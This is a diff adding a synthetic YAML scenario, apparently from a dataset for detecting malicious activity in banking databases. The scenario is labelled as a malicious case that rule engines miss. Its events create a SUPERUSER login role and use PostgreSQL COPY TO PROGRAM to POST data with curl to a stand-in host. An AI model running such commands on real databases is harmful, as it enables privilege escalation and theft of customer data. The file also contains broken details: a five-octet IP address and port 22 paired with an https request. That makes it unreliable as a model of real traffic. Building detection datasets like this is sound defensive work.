@@ -1,0 +1,23 @@
+scenario_id: gen_banking_26_data_tamper_mal_621
+family_id: gen_banking_26_data_tamper_mal_fam621
+domain: banking
+time_of_day: 01:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: teller
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_493794 SUPERUSER LOGIN PASSWORD 'x68843'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 193.42.33.154.153
+      port: 22
